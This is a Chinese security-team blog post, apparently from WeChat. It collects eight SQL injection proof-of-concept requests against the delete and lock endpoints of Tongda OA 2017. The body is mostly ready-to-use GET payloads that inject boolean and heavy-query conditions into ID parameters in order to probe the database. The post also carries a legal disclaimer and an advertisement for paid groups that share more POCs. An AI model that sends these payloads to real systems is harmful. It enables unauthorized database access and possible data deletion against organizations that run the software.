#  通达OA 2017多个delete SQL注入漏洞POC合集

原创 CVES实验室  [ 山海之关 ](javascript:void\(0\);)

**山海之关** ![]()

微信号 shg-sec

功能介绍 山海关安全团队公众号。

____

___发表于_

收录于合集

#poc 13 个

#漏洞复现 4 个

![]()

**严正声明**

 **1\. 本文仅用于技术交流，目的是向相关安全人员展示漏洞的存在和利用方式，以便更好地 提高网络安全意识和技术水平。**

 **2\. 任何人不得利用本文中的技术手段进行 非法攻击和侵犯他人的隐私和财产权利。一旦发生任何违法行为，责任自负。**

 **3\. 本文中提到的漏洞验证 poc  仅用于授权测试，任何未经授权的测试均属于非法行为。请在法律许可范围内使用此 poc。**

 **4\. CVES实验室对使用此 poc 导致的任何直接或间接损失不承担任何责任。使用此 poc 的 风险由使用者自行承担。**

 **POC合集**

 **注：该漏洞由delete功能引发，请勿直接测试。**  

 **POC1：**  

  *   *   *   * 

    
    
     GET/general/hr/recruit/recruitment/delete.php?RECRUITMENT_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC2：**  

  *   *   *   * 

    
    
     GET/general/hr/manage/staff_relatives/delete.php?RELATIVES_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC3：**

  *   *   * 

    
    
     GET/general/hr/salary/welfare_manage/delete.php?WELFARE_ID=1)%20and%20(substr(DATABASE(), 1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC4：**  

  *   *   *   * 

    
    
     GET/general/system/approve_center/flow_guide/flow_type/set_print/delete.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC5：**  

  *   *   *   * 

    
    
     GET/general/hr/training/record/delete.php?RECORD_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)% 20and(1)=(1

 **POC6：**  

  *   *   *   * 

    
    
     GET/general/vehicle/checkup/delete.php?VU_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC7：**  

  *   *   *   * 

    
    
     GET/general/system/censor_words/module/delete.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **POC8：**

  *   *   *   * 

    
    
     GET/general/wiki/cp/manage/lock.php?TERM_ID_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

 **更多POC请关注“追洞学苑”**  

![]()

 **广告**

 **目前团队运营了两个知识星球分别为 “追洞学苑”与“挖洞学苑”：**  

 **追洞学苑】** **会分享最新的漏洞POC，1day0day挖掘文章。**

 **挖洞学苑】** **会分享国内/外原创漏洞赏金项目报告，各种漏洞挖掘小技巧。**

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

